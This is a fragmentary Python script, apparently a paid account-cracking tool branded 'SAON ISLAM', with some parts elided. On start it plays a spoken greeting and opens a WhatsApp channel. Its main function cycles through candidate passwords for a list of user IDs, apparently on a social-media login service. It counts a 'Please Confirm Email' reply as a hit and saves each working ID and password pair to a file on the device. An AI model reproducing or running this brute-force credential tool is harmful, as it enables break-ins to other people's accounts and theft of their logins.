#-------------------------[WELCOME]---------------------#
#TOOLS OWNER MD SIFAT HOSSAIN
#SIFAT IS BRAND 
#CODING BY hackerboy sifat
#---------------------------| Import |---------------------------#
...
print('<|©|> LOADING HAFEZ JS CYBER PAID TOOLS ')
try:
...
os.system('clear')
os.system('espeak -a 300 "assalamu, olaikum, everyone, well,come to,SAON, ISLAM, tools"')
os.system('xdg-open https://whatsapp.com/channel/0029Vb6SV3h8aKvL260klM1r.Ok.Bro')
#---------------------------| Logo |---------------------------#
logo=(f""" ▗▄▄▖ ▗▄▖  ▗▄▖ ▗▖  ▗▖
▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▖▐▌
 ▝▀▚▖▐▛▀▜▌▐▌ ▐▌▐▌ ▝▜▌
▗▄▄▞▘▐▌ ▐▌▝▚▄▞▘▐▌  ▐▌
\033[0;95m╔═══════════════════════════════════════════╗
\033[0;95m║  \033[0;94m [!]\033[0;90mTOOL OWER :\033[0;92m SAON.ISLAM        \033[0;95m║
...
\033[0;95m║ \033[0;94m  [!]\033[0;90mTEAM      :\033[0;92m SAON ISLAM           \033[0;95m║
\033[0;95m║ \033[0;94m  [!]\033[0;90mWHATS APP :\033[0;92m +8801870039326          \033[0;95m ║
\033[0;95m╚═══════════════════════════════════════════╝ \033[0;00m""")   
...
def ____old____(uid,pas,tl):
	global loop,ok
	sys.stdout.write(f"\r\r{white}<|SAON-ISLAM|> <|{loop}|> <|{ok}|> ");sys.stdout.flush()
	try:
		for ps in pas:
			...
			if "Please Confirm Email" in str(po):
				print(f"\r\r{green}<|SAON Islam-OK|> {uid} ● {ps}")
				open("/sdcard/SAON ISLAM-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
